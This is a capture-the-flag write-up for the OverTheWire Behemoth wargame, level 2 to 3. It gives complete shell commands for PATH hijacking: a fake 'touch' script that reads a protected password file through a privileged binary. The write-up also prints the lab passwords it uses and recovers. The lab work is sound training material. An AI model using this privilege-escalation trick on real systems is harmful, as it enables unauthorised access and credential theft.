# Behemoth Level 02 to 03

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Behemoth |
| Level | 2 -> 3 |
| Status | Complete |

## Objective

Abuse `behemoth2`'s unsafe command execution to read the next password.

## Given Access

User: `behemoth2`

Password:

```text
IxPJbQtH8q
```

## Recon

Tracing the binary shows it constructs a command around `touch` and executes it through the shell. That makes it vulnerable to `PATH` hijacking.

## Method

Create a fake `touch` script that prints `/etc/behemoth_pass/behemoth3`, make it executable, place it first in `PATH`, and run the target from that directory.

## Commands

```bash
ssh -p 2221 behemoth2@behemoth.labs.overthewire.org
mkdir -p /tmp/behemoth2-path && cd /tmp/behemoth2-path
cat > touch <<'EOF'
#!/bin/sh
cat /etc/behemoth_pass/behemoth3
EOF
chmod 755 touch
PATH=/tmp/behemoth2-path:$PATH /behemoth/behemoth2
```

## Result

Password for `behemoth3`:

```text
JQ6tZGqt0i
```

## Lesson

If a privileged helper shells out to an unqualified program name, try the simple command-resolution bug before overcomplicating the level.

## References

- https://overthewire.org/wargames/behemoth/
